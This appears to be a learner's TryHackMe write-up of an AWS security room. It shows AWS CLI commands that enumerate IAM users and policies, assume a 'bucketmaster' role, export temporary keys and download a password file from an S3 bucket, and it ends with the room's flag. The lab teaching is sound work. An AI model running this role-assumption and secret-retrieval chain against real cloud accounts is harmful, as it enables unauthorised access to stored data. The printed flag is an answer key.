# Day 23 – AWS Security - S3cret Santa

## 🎯 Objectives

- Learn the basics of AWS accounts.
- Enumerate the privileges granted to an account, from an attacker's perspective.
- Familiarise yourself with the AWS CLI.
 
---

## 🖥️ Environment

- **Platform:** TryHackMe  
- **Tools used:** AWS, Terminal
---

## 🔍 Approach

This room was designed to get you an introduction to access management on AWS and how to interact with AWS via terminal. We learned that our AWS account details are saved on Linux in the path: `~/.aws/credentials` and we can further recall them in terminal with the command:
```
aws sts get-caller-identity
```
We then used `aws iam list-users` which gave us a list of all the users on AWS. We found a suspicious user here called ***sir.carrotbane***.

We ran the below 2 commands to see whether the suspicious user had any IAM policies attached or was part of any group within AWS. Unfortunately this was not the case.

```
aws iam list-attached-user-policies --user-name sir.carrotbane

aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane

```
I then had to do some figuring out as I wasn't sure what the difference was between an inline policy and an managed IAM policy. Inline would be the policy of a single user where a managed IAM policy is a policy that can be assigned to multiple users/groups. We did discover that that the inline policy for `sir.carrotbane` is `BucketMasterPolicy`. 

We then ran the below code to see what permissions `sir.carrotbane` has.

```
aws iam get-user-policy --policy-name BucketMasterPolicy --user-name sir.carrotbane
```

In here we discovered that the account has the `"sts:AssumeRole"` meaning that it will allow you to temporarily use the permissions of role on their own account

We then needed to look how to assume access of the account. We first ran the below which provided us with the AccessKeyID, SecretAccessKey and SessionToken.
```
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
```

We then exported it via the code below to assume temporary access as this policy.

```
ubuntu@tryhackme:~$ export AWS_ACCESS_KEY_ID="<inserted access key id here>"
ubuntu@tryhackme:~$ export AWS_SECRET_ACCESS_KEY="<inserted secret access key here>"
ubuntu@tryhackme:~$ export AWS_SESSION_TOKEN="<inserted session token here>"

```

Now it's time to see what's in the S3 buckets of `sir.carrotbane`. We ran the below 3 commands. The first one lists all the S3 buckets, the second one lists the objects in the `easter-secrets-123145` bucket and the third one exfiltrates the `cloud_password_txt` to our current working direction in terminal.

```
aws s3api list-buckets

aws s3api list-objects --bucket easter-secrets-123145

aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt

```

We then ran a simple `cat cloud_password.txt` which revealed the hidden flag and finishes the task.

---

## ⚠️ Challenges

- Understanding how AWS applies permissions and policies.
- Learning how to inspect and amend permissions and policies with terminal commands.

---

## 🚩 Flags

- THM{more_like_sir_cloudbane}

---

## 📚 Lessons Learned

Today I learned it was possible to manage AWS (quite efficiently so) via terminal which opens up a whole world of Bash scripting to interact with AWS. Also learned about how permissions are managed within AWS.

---

## 💭 Further Thoughts

I loved this room as I'm semi familiar with the cloud. Connecting the Linux and AWS cloud dots was exciting and I'm looking forward to see what further it can do.
